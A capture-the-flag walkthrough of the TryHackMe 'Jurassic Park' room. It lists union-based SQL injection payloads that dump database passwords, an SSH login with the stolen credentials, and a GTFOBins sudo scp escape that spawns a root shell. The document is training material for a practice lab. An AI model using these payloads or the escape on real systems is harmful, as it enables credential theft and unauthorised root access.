---
title: "Jurassic Park → TryHackMe"
authors: [shubham]
tags: [tryhackme, cybersecurity, sqli, privilege-escalation, ctf]
---

## Jurassic Park TryHackMe

login : `ssh dennis@<TARGET_IP>`  
password : *(Obtained via SQL Injection in the web application)*

### Task 
The objective is to find multiple flags scattered across the machine by exploiting a vulnerable web application to gain a foothold, and subsequently abusing `sudo` privileges to escalate to root.

### Quick theory 

When a web application takes user input and passes it directly into a database query without sanitization, it becomes vulnerable to **SQL Injection (SQLi)**. You can use `UNION` based SQLi to append your own queries and dump database credentials.

Once inside a system, privilege escalation can often be achieved by checking what commands the current user can run as root using `sudo -l`. If a permitted binary has known bypasses, tools like **GTFOBins** provide command snippets to exploit them and spawn a root shell.

Tools you’ll use:  
`Burp Suite` -> to capture, modify, and fuzz HTTP requests (Intruder/Repeater).  
`SQLi (Manual)` -> to enumerate database columns, tables, and dump passwords.  
`scp` (via GTFOBins) -> to escalate privileges to root.

### Solution

```bash
# 1. After an Nmap scan reveals port 80 and 22, visit the web app.
# The 'id' parameter in the shop package URL is vulnerable to SQLi.
# Determine the number of columns (fails at 6, meaning there are 5 columns):
?id=1+ORDER+BY+6
```

```bash
# 2. Extract database tables and column names:
?id=1+UNION+SELECT+1,table_name,3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()
?id=1+UNION+SELECT+1,column_name,3,4,5+FROM+information_schema.columns+WHERE+table_name="users"+AND+table_schema=database()
```

```bash
# 3. Dump the password from the users table:
?id=1+UNION+SELECT+1,password,3,password,5+FROM+users
```

```bash
# 4. Use Burp Intruder to fuzz the 'id' parameter from 0-50 to find the valid user "dennis".
# Log in via SSH using the dumped credentials:
neocipher27@fedora:~$ ssh dennis@<TARGET_IP>
# Capture the first flag in the user's directory.
```

```bash
# 5. Check bash history for the third flag and hints for the fifth flag:
dennis@jurassic:~$ cat .bash_history
# OR
dennis@jurassic:~$ history
```

```bash
# 6. Check for sudo privileges to escalate to root:
dennis@jurassic:~$ sudo -l
# Output shows 'scp' can be run as root without a password.
```

```bash
# 7. Exploit scp using GTFOBins to spawn a root shell:
dennis@jurassic:~$ TF=$(mktemp)
dennis@jurassic:~$ echo 'sh 0<&2 1>&2' > $TF
dennis@jurassic:~$ chmod +x "$TF"
dennis@jurassic:~$ sudo scp -S $TF x y:
```

```bash
# 8. Capture the fifth flag in the root directory:
root@jurassic:~# cat /root/flag5.txt
# 9. Find the remaining flags (flag 2 is inside the ubuntu user's bash history):
root@jurassic:~# cat /home/ubuntu/.bash_history
```